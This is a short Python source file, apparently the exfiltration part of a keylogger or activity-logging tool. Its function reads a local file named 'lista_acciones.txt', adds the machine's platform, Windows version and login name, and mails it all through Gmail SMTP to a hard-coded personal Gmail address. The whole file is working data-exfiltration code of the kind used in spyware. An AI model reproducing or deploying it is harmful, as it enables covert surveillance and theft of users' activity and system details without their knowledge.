from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from smtplib import SMTP
from email.mime.base import MIMEBase
from email import encoders
import os,sys


def correo():
    from_address = "thunder007.25@gmail.com"
    to_address = "thunder007.25@gmail.com"
    message = "Mensaje ennviado de " + sys.platform + "\n" + str(sys.getwindowsversion())
    mime_message = MIMEMultipart()
    mime_message["From"] = from_address
    mime_message["To"] = to_address
    mime_message["Subject"] = "Acciones de " + os.getlogin()
    mime_message.attach(MIMEText(message))
    smtp = SMTP("smtp.gmail.com",587)
    f="lista_acciones.txt"

    part = MIMEBase('application', "octet-stream")
    file= open(f, 'rb')
    part.set_payload(file.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="{0}"'.format(os.path.basename(f)))
    mime_message.attach(part)

    smtp.ehlo()
    smtp.starttls()
    smtp.ehlo()
    smtp.login(from_address, "")
    smtp.sendmail(from_address, to_address, mime_message.as_string())
    smtp.quit()

